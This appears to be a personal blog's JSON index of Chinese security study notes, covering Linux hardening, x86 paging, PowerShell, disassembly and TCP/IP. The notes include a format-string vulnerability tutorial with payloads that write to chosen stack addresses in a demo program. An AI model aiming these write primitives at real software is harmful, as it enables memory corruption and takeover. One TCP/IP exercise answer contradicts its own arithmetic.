{"meta":{"title":"hack_zz","subtitle":"每天进步一点点","description":"","author":"hack_zz","url":"http://zwjsfdbb.top","root":"/"},"pages":[{"title":"","date":"2023-10-26T13:37:28.228Z","updated":"2023-06-01T14:11:57.600Z","comments":true,"path":"Linux 服务器加固技术.html","permalink":"http://zwjsfdbb.top/Linux%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8A%A0%E5%9B%BA%E6%8A%80%E6%9C%AF.html","excerpt":"","text":"linux 服务器主机加固技术Linux的主机加固主要分为：账号安全、认证授权、协议安全、审计安全。除此之外，就是些硬件加固方案。 一 、账号安全1、设置复杂密码并修改密码策略、密码强度、登陆次数 1234567891011121314151617181920212223242526# 修改文件/etc/login.defsPASS_MAX_DAYS 90 密码最长有效期PASS_MIN_DAYS 10 密码修改之间最小的天数PASS_MIN_LEN 8 密码长度PASS_WARN_AGE 7 口令失效前多少天开始通知用户修改密码# 编辑文件/etc/pam.d/password-authpassword requisite pam_pwquality.so try_first_pass local_users_only retry=3 authtok_type= difok=1 minlen=8 ucredit=-1 lcredit=-1 dcredit=-1difok= 定义新密码中必须要有几个字符和旧密码不同minlen=新密码的最小长度ucredit= 新密码中可以包含的大写字母的最大数目。-1 至少一个lcredit=新密码中可以包含的小写字母的最大数dcredit=定新密码中可以包含的数字的最大数目 注：这个密码强度的设定只对&quot;普通用户&quot;有限制作用，root用户无论修改自己的密码还是修改普通用户的时候，不符合强度设置依然可以设置成功 #编辑文件 /etc/pam.d/sshd auth required pam_tally2.so deny=3 unlock_time=150 even_deny_root root_unlock_time300 # 锁定用户的管理 pam_tally2 查看被锁定的用户 pam_tally2 --reset -u username 将被锁定的用户解锁 # 限制特定IP登录 vim /etc/hosts.deny sshd : 192.168.0.1 2、修改默认的保存历史命令条数,超时时间 12345678#编辑 /etc/profileHISTSIZE=1000TMOUT=600 # 五分钟未动，服务器超时自动断开与客户端的链接。# 用户注销时删除命令记录查看/etc/skel/.bash_logout文件，增加如下行rm -f $HOME/.bash_history 4、禁用无用账户 12345cat /etc/passwd #查看口令文件，确认不必要的账号。cat /etc/shadow# 使用命令passwd -l 锁定不必要的账号。# 使用命令passwd -u 解锁需要恢复的账号。 5、重要文件加上不可改变属性 1234567#把重要文件加上不可改变属性chattr +i /etc/passwdchattr +i /etc/shadowchattr +i /etc/gshadowchattr +i /etc/groupchattr +i /etc/inetd.confchattr +i /etc/httpd.conf 二、协议安全1、SSH协议安全 1234567891011121314151617# 禁止root用户远程登陆，更改默认SSH端口# 编辑/etc/ssh/sshd_configPermitRootLogin no# 更改SSH默认端口/etc/ssh/sshd_config 更改Port或追加Port# 仅允许SSH协议版本2编辑/etc/ssh/sshd_config文件并查找下面这样的行：Protocol 2,1 修改为Protocol 2 # 禁止明文口令认证方式，只保留了公钥证书方式认证 2、禁用telnet 12/etc/xinetd.d/telnetdisable=yes 2、FTP 协议 1234567891011# 禁止root 登录ftpcat /etc/pam.d/vsftpdAuth required pam_listfile.so item=user sense=deny file=/etc/vsftpd/ftpusers onerr=succeed#其中file=/etc/vsftpd/ftpusers即为当前系统上的ftpusers文件.echo “root” &gt;&gt; /etc/vsftpd/ftpusersv# 禁止匿名ftpvim /etc/vsftpd/vsftpd.confanonymous_enable=NO # 如果存在 anonymous_enable 则修改，如果不存在则手动增加 3、防止flood攻击 12345gedit /etc/sysctl.conf增加net.ipv4.tcp_syncookies = 1随后sysctl -p 4、禁用ping 1echo 0 &gt; /proc/sys/net/ipv4/icmp_echo_igore_all 5、检查异常进程 1234567ps aux|sort -rn -k +3|head#检查cpu占用前10ps aux|sort -rn -k +4|head#检查内存占用前10 6、关闭无效和无用的服务以及端口 123456789#比如邮箱service postfix statuschkconfig --del postfixchkconfig postfix off# 比如cpusservice cups statuschkconfig --del cupschkconfig cups off 7、设置防火墙策略 12345678910111213141516171819202122根据实际情况设置iptables -I INPUT -s 22.48.11.11 -j DROP# 22.48.11.11的包全部屏蔽iptables -I INPUT -s 22.48.11.0/24 -j DROP#22.48.11.1到22.48.11.255的访问全部屏蔽iptables -I INPUT -s 192.168.1.1 -p tcp --dport 80 -j DROP# 192.168.1.1的80端口的访问全部屏蔽iptables -I INPUT -s 192.168.1.0/24 -p tcp --dport 80 -j DROP#192.168.1.1到192.168.1.255的80端口的访问全部屏蔽service iptabels restart#重启防火墙 8、定时任务查看 12crontab -l at -l 三、认证授权1、配置用户最小权限 123chmod 644 /etc/passwdchmod 400 /etc/shadowchmod 644 /etc/group 2、文件与目录缺省权限控制 1234567891011umask 027source /etc/profile# 注 用全部权限777去减这个数值umask值 目录 文件022 755 644027 750 640002 775 664006 771 660007 770 660 3、检查是否有其他uid&#x3D;0的用户 1awk -F “：” &#x27;($3==0) &#123;print $1&#125; &#x27; /etc/passwd 4、限制能够su为root的用户 12345678910#查看是否有auth required /lib/security/pam_wheel.so这样的配置条目cat /etc/pam.d/su在头部添加：auth required /lib/security/pam_wheel.so group=wheel这样，只有wheel组的用户可以su到root#将test用户加入到wheel组usermod -G10 test 四、日志审计1、建立日志服务器，启用远程日志功能 123456789101112# 客户端gedit /etc/rsyslog.conf*.* @Syslog日志服务器IPsystemctl restart rsyslog# 服务器gedit /etc/rsyslog.conf 取消下面两行的注释# provides TCP syslog reception#module(load=&quot;imtcp&quot;)#input(type=&quot;imtcp&quot; port=&quot;514&quot;)systemctl restart rsyslog #重启服务firewall-cmd --add-port=514/tcp #开启防火墙 2、检查是否记录安全日志 123456789gedit /etc/syslog.conf 或者 /etc/rsyslog.conf在文件中加入如下内容:*.err;kern.debug;daemon.notice /var/log/messages #可以改成远程日志服务器chmod 640 /var/log/messages # 配置所有者可读写，所在组可读，其他用户以及组不可读service rsyslog restart 3、日志保留半年以上 12sed -i s/&#x27;rotate 4&#x27;/&#x27;rotate 12&#x27;/g /etc/logrotate.conf(修改)service syslog restart(重启) 4、定期查看系统日志 12345678ps -aef | grep syslog #确定syslog服务是否启用cat /etc/rsyslog.conf #查看syslogd的配置，并确认日志文件日否存在#系统日志 (默认) /var/log/messages#cron日志 (默认) /var/log/cron#安全日志 (默认) /var/log/secure 五、硬件加固1、BIOS保护 设置BIOS密码 禁止主机从外部媒体设备启动 2、硬盘加密 3、禁用USB设备 123456# 阻止 usb_storage 内核模块加载gedit /etc/modprobe.d/blacklist.conf blacklist usb_storage# 用于卸载(或移除) usb_storage 内核模块#nano /etc/rc.localmodprobe -r usb_storage 参考链接 1、https://www.freebuf.com/articles/system/250501.html 2、http://www.tlcement.com/361031.html"},{"title":"分类","date":"2023-07-05T13:31:53.000Z","updated":"2023-07-05T13:33:36.598Z","comments":true,"path":"categories/index.html","permalink":"http://zwjsfdbb.top/categories/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2023-07-05T13:32:24.000Z","updated":"2023-07-05T13:33:41.728Z","comments":true,"path":"link/index.html","permalink":"http://zwjsfdbb.top/link/index.html","excerpt":"","text":""},{"title":"标签","date":"2023-07-05T13:31:10.000Z","updated":"2023-07-05T13:33:28.461Z","comments":true,"path":"tags/index.html","permalink":"http://zwjsfdbb.top/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"格式化漏洞学习","slug":"逆向/格式化漏洞学习","date":"2024-03-11T16:00:00.000Z","updated":"2024-03-12T14:51:27.663Z","comments":true,"path":"2024/03/12/逆向/格式化漏洞学习/","link":"","permalink":"http://zwjsfdbb.top/2024/03/12/%E9%80%86%E5%90%91/%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/","excerpt":"1、printf 等函数的基本使用123printf(&quot;%s%n&quot;, &quot;01234&quot;, &amp;n); // n = 5// %n 能够将此前打印字符的数量存储到传入的指针变量 n 中。// %n 转换指示符将 %n 当前已经成功写入流或缓冲区中的字符个数存储到地址由参数指定的整数 2、漏洞利用 使程序崩溃12printf(&quot;%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s&quot;);// 对于每一个 %s，printf() 都要从栈中获取一个数字，把该数字视为一个地址，然后打印出地址指向的内存内容，直到出现一个 NULL 字符。 查看栈内容12345678910111213141516171819202122232425#include&lt;stdio.h&gt;void main() &#123; char format[128]; int arg1 = 1, arg2 = 0x88888888, arg3 = -1; char arg4[10] = &quot;ABCD&quot;; scanf(&quot;%s&quot;, format); printf(format, arg1, arg2, arg3, arg4); printf(&quot;\\n&quot;);&#125;//gdb-peda$ x/10x $esp//0xffffd550: 0xffffd584 0x00000001 0x88888888 0xffffffff//0xffffd560: 0xffffd57a 0xffffd584 0x56555220 0x565555d7//0xffffd570: 0xf7ffda54 0x00000001 //Guessed arguments://arg[0]: 0xffffd584 (&quot;%p.%p.%p.%p.%p&quot;)//arg[1]: 0x1//arg[2]: 0x88888888//arg[3]: 0xffffffff//arg[4]: 0xffffd57a (&quot;ABCD&quot;) //输出// 0x1.0x88888888.0xffffffff.0xffffd57a.0xffffd584 覆盖栈内容-任意地址覆盖1234567891011121314151617181920212223242526printf(&quot;%0134512640d%n\\n&quot;, 1, &amp;i);//根据d前面的代表输出的最小位数，而i会接收所有的长度，所有i=134512640，也即0x8048000 //根据测试结果 python print(&quot;AAAA&quot;+&quot;.%p&quot;*20) AAAA在第13个参数，print(&quot;\\x38\\xd5\\xff\\xff%08x%08x%012d%13$n&quot;)// 0xffffd538 会被存储在第13个参数， 0xffffd538是参数2 的地址，%13$n 表示将前面已经输出的字符数量存储到内存地址 13 所对应的变量中，即为0x20写入0xffffd538，实现赋值0x20给arg2.//%13$n 表示将已经输出的字符数目赋值给第 13 个可变参数（即传递给函数的第 14 个参数，因为第一个参数也算一个）所对应的 int* 类型变量逐字节覆盖printf(&quot;%s %hhn\\n&quot;, str, &amp;c); // 写入单字节printf(&quot;%s %hn\\n&quot;, str, &amp;s); // 写入双字节printf(&quot;%s %n\\n&quot;, str, &amp;i); // 写入4字节printf(&quot;%s %ln\\n&quot;, str, &amp;l); // 写入8字节printf(&quot;%s %lln\\n&quot;, str, &amp;ll); // 写入16字节$ python2 -c &#x27;print(&quot;A%15$hhn&quot;+&quot;\\x38\\xd5\\xff\\xff&quot;)&#x27; &gt; text0xffffd530: 0xffffd564 0x00000001 0x88888801 0xffffffff$ python2 -c &#x27;print(&quot;A%15$hnA&quot;+&quot;\\x38\\xd5\\xff\\xff&quot;)&#x27; &gt; text0xffffd530: 0xffffd564 0x00000001 0x88880001 0xffffffff$ python2 -c &#x27;print(&quot;A%15$nAA&quot;+&quot;\\x38\\xd5\\xff\\xff&quot;)&#x27; &gt; text0xffffd530: 0xffffd564 0x00000001 0x00000001 0xffffffff","text":"1、printf 等函数的基本使用123printf(&quot;%s%n&quot;, &quot;01234&quot;, &amp;n); // n = 5// %n 能够将此前打印字符的数量存储到传入的指针变量 n 中。// %n 转换指示符将 %n 当前已经成功写入流或缓冲区中的字符个数存储到地址由参数指定的整数 2、漏洞利用 使程序崩溃12printf(&quot;%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s&quot;);// 对于每一个 %s，printf() 都要从栈中获取一个数字，把该数字视为一个地址，然后打印出地址指向的内存内容，直到出现一个 NULL 字符。 查看栈内容12345678910111213141516171819202122232425#include&lt;stdio.h&gt;void main() &#123; char format[128]; int arg1 = 1, arg2 = 0x88888888, arg3 = -1; char arg4[10] = &quot;ABCD&quot;; scanf(&quot;%s&quot;, format); printf(format, arg1, arg2, arg3, arg4); printf(&quot;\\n&quot;);&#125;//gdb-peda$ x/10x $esp//0xffffd550: 0xffffd584 0x00000001 0x88888888 0xffffffff//0xffffd560: 0xffffd57a 0xffffd584 0x56555220 0x565555d7//0xffffd570: 0xf7ffda54 0x00000001 //Guessed arguments://arg[0]: 0xffffd584 (&quot;%p.%p.%p.%p.%p&quot;)//arg[1]: 0x1//arg[2]: 0x88888888//arg[3]: 0xffffffff//arg[4]: 0xffffd57a (&quot;ABCD&quot;) //输出// 0x1.0x88888888.0xffffffff.0xffffd57a.0xffffd584 覆盖栈内容-任意地址覆盖1234567891011121314151617181920212223242526printf(&quot;%0134512640d%n\\n&quot;, 1, &amp;i);//根据d前面的代表输出的最小位数，而i会接收所有的长度，所有i=134512640，也即0x8048000 //根据测试结果 python print(&quot;AAAA&quot;+&quot;.%p&quot;*20) AAAA在第13个参数，print(&quot;\\x38\\xd5\\xff\\xff%08x%08x%012d%13$n&quot;)// 0xffffd538 会被存储在第13个参数， 0xffffd538是参数2 的地址，%13$n 表示将前面已经输出的字符数量存储到内存地址 13 所对应的变量中，即为0x20写入0xffffd538，实现赋值0x20给arg2.//%13$n 表示将已经输出的字符数目赋值给第 13 个可变参数（即传递给函数的第 14 个参数，因为第一个参数也算一个）所对应的 int* 类型变量逐字节覆盖printf(&quot;%s %hhn\\n&quot;, str, &amp;c); // 写入单字节printf(&quot;%s %hn\\n&quot;, str, &amp;s); // 写入双字节printf(&quot;%s %n\\n&quot;, str, &amp;i); // 写入4字节printf(&quot;%s %ln\\n&quot;, str, &amp;l); // 写入8字节printf(&quot;%s %lln\\n&quot;, str, &amp;ll); // 写入16字节$ python2 -c &#x27;print(&quot;A%15$hhn&quot;+&quot;\\x38\\xd5\\xff\\xff&quot;)&#x27; &gt; text0xffffd530: 0xffffd564 0x00000001 0x88888801 0xffffffff$ python2 -c &#x27;print(&quot;A%15$hnA&quot;+&quot;\\x38\\xd5\\xff\\xff&quot;)&#x27; &gt; text0xffffd530: 0xffffd564 0x00000001 0x88880001 0xffffffff$ python2 -c &#x27;print(&quot;A%15$nAA&quot;+&quot;\\x38\\xd5\\xff\\xff&quot;)&#x27; &gt; text0xffffd530: 0xffffd564 0x00000001 0x00000001 0xffffffff","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"反汇编结构识别","slug":"逆向/反汇编结构识别","date":"2024-03-10T16:00:00.000Z","updated":"2024-03-12T14:48:46.848Z","comments":true,"path":"2024/03/11/逆向/反汇编结构识别/","link":"","permalink":"http://zwjsfdbb.top/2024/03/11/%E9%80%86%E5%90%91/%E5%8F%8D%E6%B1%87%E7%BC%96%E7%BB%93%E6%9E%84%E8%AF%86%E5%88%AB/","excerpt":"1、if else结构 12345678910#include &lt;stdio.h&gt;int main(int argc, char* argv[]) &#123; if (argc == 0) &#123; printf(&quot;argc == 0&quot;); &#125; else &#123; printf(&quot;argc != 0&quot;); &#125; return 0;&#125; 反汇编结构 结构： 2、switch 1234567891011121314151617#include &lt;stdio.h&gt;int main(int argc, char* argv[]) &#123;int n = 1;scanf(&quot;%d&quot;, &amp;n);switch(n) &#123;case 1:printf(&quot;n == 1&quot;);break;case 3:printf(&quot;n == 3&quot;);break;case 100:printf(&quot;n == 100&quot;);break;&#125;return 0;&#125; 反汇编结构","text":"1、if else结构 12345678910#include &lt;stdio.h&gt;int main(int argc, char* argv[]) &#123; if (argc == 0) &#123; printf(&quot;argc == 0&quot;); &#125; else &#123; printf(&quot;argc != 0&quot;); &#125; return 0;&#125; 反汇编结构 结构： 2、switch 1234567891011121314151617#include &lt;stdio.h&gt;int main(int argc, char* argv[]) &#123;int n = 1;scanf(&quot;%d&quot;, &amp;n);switch(n) &#123;case 1:printf(&quot;n == 1&quot;);break;case 3:printf(&quot;n == 3&quot;);break;case 100:printf(&quot;n == 100&quot;);break;&#125;return 0;&#125; 反汇编结构 结构 ： 比较-&gt;比较-&gt;比较-&gt;jmp-分支-&gt;jmp-&gt;分支-&gt;jmp-&gt;结束 此外对于case 条件较为连续的还有 3、do while 12345678910#include &lt;stdio.h&gt;int main(int argc, char* argv[]) &#123; int sum = 0; int i = 0; do &#123; sum += i; i++; &#125; while (i &lt;= argc); return sum;&#125; 反汇编结构： 结构为 执行体-&gt;自增-&gt;判断 4、while 12345678910#include &lt;stdio.h&gt;int main(int argc, char* argv[]) &#123; int sum = 0; int i = 0; while (i &lt;= argc) &#123; sum += i; i++; &#125; return sum;&#125; 结构为： 判断-&gt;执行体-&gt;自增-&gt;jmp 5、for 循环 12345678#include &lt;stdio.h&gt;int main(int argc, char* argv[]) &#123; int sum = 0; for (int i = 0; i &lt;= argc; i++) &#123; sum += i; &#125; return sum;&#125; 反汇编结构： 结构： 前后各一个jmp ，中间是循环体和比较","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"powershell 指令学习","slug":"编程/powershell 指令学习","date":"2024-03-10T16:00:00.000Z","updated":"2024-03-12T15:27:16.275Z","comments":true,"path":"2024/03/11/编程/powershell 指令学习/","link":"","permalink":"http://zwjsfdbb.top/2024/03/11/%E7%BC%96%E7%A8%8B/powershell%20%E6%8C%87%E4%BB%A4%E5%AD%A6%E4%B9%A0/","excerpt":"1、powershell 简介 Powershell 是运行在windows上实现系统和应用程序管理自动化的命令行脚本环境。 获取当前执行策略：Get-ExecutionPolicy Restricted 默认设置，不允许任何脚本执行 AllSigned 允许有签名的脚本执行 RemoteSigned 本地的不需要执行，网络下载的不需要执行 Unstricted 运行所有的Script执行 如果要运行自己编写的脚本，需要修改执行策略 1set-ExecutionPolicy RemoteSigned 2、基本 操作 字符串： 123456789//定义$string1 = &quot;13445&quot;//字符串拼接$stings2 = &quot;s&quot; + &quot;h&quot;//子串$string3 = string.substring(2,2) 第一个参数是起始位置，第二个是长度//替换$string4 = string.replace(&quot;1&quot;,&quot;2&quot;) 数组 12$array = 1,2,3,4,5$array[1] 哈希表 1$student = @&#123;&quot;name&quot;:&quot;xxx&quot;,&quot;age&quot;:&quot;4&quot;&#125; 循环 1234567//for 循环for($i=0;$i -lt 10; $i++)&#123; xxxx&#125;//foreach foreach($i in $array)&#123;Write-Host $i&#125; 常用的powershell命令 文件管理：","text":"1、powershell 简介 Powershell 是运行在windows上实现系统和应用程序管理自动化的命令行脚本环境。 获取当前执行策略：Get-ExecutionPolicy Restricted 默认设置，不允许任何脚本执行 AllSigned 允许有签名的脚本执行 RemoteSigned 本地的不需要执行，网络下载的不需要执行 Unstricted 运行所有的Script执行 如果要运行自己编写的脚本，需要修改执行策略 1set-ExecutionPolicy RemoteSigned 2、基本 操作 字符串： 123456789//定义$string1 = &quot;13445&quot;//字符串拼接$stings2 = &quot;s&quot; + &quot;h&quot;//子串$string3 = string.substring(2,2) 第一个参数是起始位置，第二个是长度//替换$string4 = string.replace(&quot;1&quot;,&quot;2&quot;) 数组 12$array = 1,2,3,4,5$array[1] 哈希表 1$student = @&#123;&quot;name&quot;:&quot;xxx&quot;,&quot;age&quot;:&quot;4&quot;&#125; 循环 1234567//for 循环for($i=0;$i -lt 10; $i++)&#123; xxxx&#125;//foreach foreach($i in $array)&#123;Write-Host $i&#125; 常用的powershell命令 文件管理： 12345678910111213141516171819//新建文件、目录New-Item FilePath -ItemType FileNew-Item FileDir -ItemType Directory//删除文件、目录Remove-Item FilePath//设置文件内容Set-Content FilePath -Value &quot;1234&quot;//追加内容Add-Content FilePath -Value &quot;222&quot;//获取内容Get-Content FilePath //清除内容Clear-Content FilePath//移动文件Move-Item srcPath DstPath//复制文件Copy-Item SrcPath DstPath // 判断文件是否存在Test-Path FilePath 注册表操作 1Get-ItemProperty -Path $RegistryPath -Name $ItemName","categories":[{"name":"编程","slug":"编程","permalink":"http://zwjsfdbb.top/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"编程","slug":"编程","permalink":"http://zwjsfdbb.top/tags/%E7%BC%96%E7%A8%8B/"}]},{"title":"文件注册表查找特定日期文件","slug":"应急响应/文件注册表查找特定日期文件","date":"2024-03-10T16:00:00.000Z","updated":"2024-03-12T15:30:46.333Z","comments":true,"path":"2024/03/11/应急响应/文件注册表查找特定日期文件/","link":"","permalink":"http://zwjsfdbb.top/2024/03/11/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E6%96%87%E4%BB%B6%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%9F%A5%E6%89%BE%E7%89%B9%E5%AE%9A%E6%97%A5%E6%9C%9F%E6%96%87%E4%BB%B6/","excerpt":"一 、查找特定日期的文件 1、everything dm:日期 2、windows 资源管理器 ，直接输入修改日期：日期即可 二、注册表修改 1、工具 RegistryFinder","text":"一 、查找特定日期的文件 1、everything dm:日期 2、windows 资源管理器 ，直接输入修改日期：日期即可 二、注册表修改 1、工具 RegistryFinder","categories":[{"name":"应急响应","slug":"应急响应","permalink":"http://zwjsfdbb.top/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"tags":[{"name":"应急响应","slug":"应急响应","permalink":"http://zwjsfdbb.top/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}]},{"title":"内存分页原理","slug":"逆向/内存分页原理","date":"2024-03-09T16:00:00.000Z","updated":"2024-03-12T14:56:09.601Z","comments":true,"path":"2024/03/10/逆向/内存分页原理/","link":"","permalink":"http://zwjsfdbb.top/2024/03/10/%E9%80%86%E5%90%91/%E5%86%85%E5%AD%98%E5%88%86%E9%A1%B5%E5%8E%9F%E7%90%86/","excerpt":"1、基本知识 控制寄存器：x86&#x2F;x86_64 CPU中提供了控制寄存器，来决定CPU的操作模式和当前执行任务的属性。其中包括CR0-CR8 9个控制寄存器，其中CR5-CR7保留。跟内存分页相关的主要是CR0、CR2和CR3。 CR0: 包含当前处理器运行的控制标志。如位31（PG位）则决定了是否启用分页机制；位0（PE位）决定了处理器是在实模式还是保护模式下运行。位16（WP位）则是写保护位。 CR2：页故障线性地址寄存器，保存最后一次出现页故障的全32位线性地址。 CR3：页目录基址寄存器，保存页目录表的物理地址，该寄存器的12-31位（高20位）保存页目录的地址，低12位保存主要有两个标志位PCD和PWT，控制处理器内部中的分页缓存。 PDE：页目录表项，每个页目录占1个4KB内存页，每个PDE的长度为32比特位（4字节），因此每个页目录表中最多包含1024个PDE。PS位比较重要， 只存在于页目录表。0表示这是4KB页，指向一个页表。1表示这是4MB大页，直接指向物理页。物理地址计算为 PDE的高10位 + 线性地址的低22位。 123456|&lt;------ 31~12------&gt;|&lt;------ 11~0 ---------&gt;| 比特 |b a 9 8 7 6 5 4 3 2 1 0| |--------------------|-|-|-|-|-|-|-|-|-|-|-|-| 占位|&lt;-------index------&gt;| AVL |G|P|0|A|P|P|U|R|P| 属性 |S| |C|W|/|/| |D|T|S|W| PTE：页表表项，一个大小为 1024 个元素的数组，用来保存页索引号。数组中的每个元素的高20 bit 用来保存页索引号，低 12 bit 保存页属性。 123456|&lt;------ 31~12------&gt;|&lt;------ 11~0 ---------&gt;| 比特 |b a 9 8 7 6 5 4 3 2 1 0||--------------------|-|-|-|-|-|-|-|-|-|-|-|-| 占位|&lt;-------index------&gt;| AVL |G|P|D|A|P|P|U|R|P| 属性 |A| |C|W|/|/| |T| |D|T|S|W| ———————————————— P：有效位。0 表示当前表项无效。R&#x2F;W: 0 表示只读。1表示可读写。U&#x2F;S: 0 表示只能0、1、2特权级可访问。3 表示只有特权级程序可访问A: 0 表示该页未被访问，1表示已被访问。D: 脏位。0表示该页未写过，1表示该页被写过。PS: 只存在于页目录表。0表示这是4KB页，指向一个页表。1表示这是4MB大页，直接指向物理页。———————————————— 2、分页原理x86的分页机制分为普通的32位经典分页机制以及开启PAE的分页机制。 32位经典分页（二级分页机制）：10-10-12 ① 通过CR3寄存器（12-31位）定位到页目录的起始地址，取线性地址的高10位作为索引选取页目录的一个表项，也就是PDE。 ② 判断PDE的PS位，如果为1，代表这个PDE指向一个4MB的大内存页，PDE的高10位便是4MB内存页物理地址的高10位，线性地址的低22位是页内偏移。将二者合并起来便得到了物理地址。如果PS位是0，那么根据PDE中的页表基地址（取PDE的高20位，低12位设为0）定位到页表。 ③ 取线性地址的12位到21位（共10位）作为索引选取页表的一个表项，也就是PTE。 ④ 取出PTE中的内存页基地址（取PTE的高20位，低12位设为0）。 ⑤ 取线性地址的低12位作为页中偏移与上一步的内存页基地址相加便得到物理地址。","text":"1、基本知识 控制寄存器：x86&#x2F;x86_64 CPU中提供了控制寄存器，来决定CPU的操作模式和当前执行任务的属性。其中包括CR0-CR8 9个控制寄存器，其中CR5-CR7保留。跟内存分页相关的主要是CR0、CR2和CR3。 CR0: 包含当前处理器运行的控制标志。如位31（PG位）则决定了是否启用分页机制；位0（PE位）决定了处理器是在实模式还是保护模式下运行。位16（WP位）则是写保护位。 CR2：页故障线性地址寄存器，保存最后一次出现页故障的全32位线性地址。 CR3：页目录基址寄存器，保存页目录表的物理地址，该寄存器的12-31位（高20位）保存页目录的地址，低12位保存主要有两个标志位PCD和PWT，控制处理器内部中的分页缓存。 PDE：页目录表项，每个页目录占1个4KB内存页，每个PDE的长度为32比特位（4字节），因此每个页目录表中最多包含1024个PDE。PS位比较重要， 只存在于页目录表。0表示这是4KB页，指向一个页表。1表示这是4MB大页，直接指向物理页。物理地址计算为 PDE的高10位 + 线性地址的低22位。 123456|&lt;------ 31~12------&gt;|&lt;------ 11~0 ---------&gt;| 比特 |b a 9 8 7 6 5 4 3 2 1 0| |--------------------|-|-|-|-|-|-|-|-|-|-|-|-| 占位|&lt;-------index------&gt;| AVL |G|P|0|A|P|P|U|R|P| 属性 |S| |C|W|/|/| |D|T|S|W| PTE：页表表项，一个大小为 1024 个元素的数组，用来保存页索引号。数组中的每个元素的高20 bit 用来保存页索引号，低 12 bit 保存页属性。 123456|&lt;------ 31~12------&gt;|&lt;------ 11~0 ---------&gt;| 比特 |b a 9 8 7 6 5 4 3 2 1 0||--------------------|-|-|-|-|-|-|-|-|-|-|-|-| 占位|&lt;-------index------&gt;| AVL |G|P|D|A|P|P|U|R|P| 属性 |A| |C|W|/|/| |T| |D|T|S|W| ———————————————— P：有效位。0 表示当前表项无效。R&#x2F;W: 0 表示只读。1表示可读写。U&#x2F;S: 0 表示只能0、1、2特权级可访问。3 表示只有特权级程序可访问A: 0 表示该页未被访问，1表示已被访问。D: 脏位。0表示该页未写过，1表示该页被写过。PS: 只存在于页目录表。0表示这是4KB页，指向一个页表。1表示这是4MB大页，直接指向物理页。———————————————— 2、分页原理x86的分页机制分为普通的32位经典分页机制以及开启PAE的分页机制。 32位经典分页（二级分页机制）：10-10-12 ① 通过CR3寄存器（12-31位）定位到页目录的起始地址，取线性地址的高10位作为索引选取页目录的一个表项，也就是PDE。 ② 判断PDE的PS位，如果为1，代表这个PDE指向一个4MB的大内存页，PDE的高10位便是4MB内存页物理地址的高10位，线性地址的低22位是页内偏移。将二者合并起来便得到了物理地址。如果PS位是0，那么根据PDE中的页表基地址（取PDE的高20位，低12位设为0）定位到页表。 ③ 取线性地址的12位到21位（共10位）作为索引选取页表的一个表项，也就是PTE。 ④ 取出PTE中的内存页基地址（取PTE的高20位，低12位设为0）。 ⑤ 取线性地址的低12位作为页中偏移与上一步的内存页基地址相加便得到物理地址。 PAE分页（三级分页机制）2-9-9-12 PDE和PTE被扩展到64位，低12位仍然是标志位，12-35表示物理地址的高24位，物理地址从32位变成36位，最大支持64G。PDE和PTE的最后一位是XD位，为禁止执行位，对应页的数据无法被执行。 新增页目录指针表（PDPT）、二级分页机制变成三级，页目录指针表只有4个表项，每个表项寻址1G空间，共４G线性地址空间。其中CR3寄存器发生变化，低5位不用，高27位指向PDPT的起始物理地址。 32位的线性地址被分成2-9-9-12，其中2位的页目录指针索引，9位的页目录表项索引，9位的页表表项索引，12位的页内偏移。对比经典32位分页机制，页目录表项和页表表项的索引都少了1位，因此只能索引512项，每项8个字节，共4X512X512 &#x3D;2^20个页。 硬件DEP就是从引入了PAE以后采用的，主要是PDE和PTE的最后1位XD（intel）位，NX(AMD)。 疑问： １、VirtualProtect 修改内存的权限原理，为什么可以PAGE_EXECUTE，PAGE_EXECUTE_READ，PAGE_EXECUTE_READWRITE，PAGE_EXECUTE_WRITECOPY，PAGE_NO？ACCESS，PAGE_READONLY，PAGE_READWRITE，PAGE_WRITECOPY，PAGE_TARGETS_INVALID，PAGE_TARGETS_NO_UPDATE？ 答：猜测是XD位 和页表的PS属性有关。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"TCP-IP 学习笔记","slug":"系统基础/TCPIP学习笔记","date":"2024-03-09T16:00:00.000Z","updated":"2024-03-12T15:53:35.978Z","comments":true,"path":"2024/03/10/系统基础/TCPIP学习笔记/","link":"","permalink":"http://zwjsfdbb.top/2024/03/10/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/TCPIP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"第一章 概述1、ARP协议二层协议，物理层+数据链路层+ARP协议 用于转换IP地址到MAC地址。 2、ICMP协议三层协议，物理层+数据链路层+网络层+ICMP协议 用来与其他主机或路由器交换错误报文和其他重要信息。 3、unix 系统端口定义文件","text":"第一章 概述1、ARP协议二层协议，物理层+数据链路层+ARP协议 用于转换IP地址到MAC地址。 2、ICMP协议三层协议，物理层+数据链路层+网络层+ICMP协议 用来与其他主机或路由器交换错误报文和其他重要信息。 3、unix 系统端口定义文件1cat /etc/services 4、 课后习题 请计算最多有多少个A类、B类和C类网络号。 123A类 前8位，第一位为0，2^7=128 不能全0，不能127，就只有126B类 前16位，前两位为10，2^14=16,384，不可全0，就只有16383C类 前24位，前三位110，2^21=2,097,152，不可全0，就只有2,097,152 获取一份主机需求RFC拷贝[Braden 1989a]，阅读有关应用于T C P 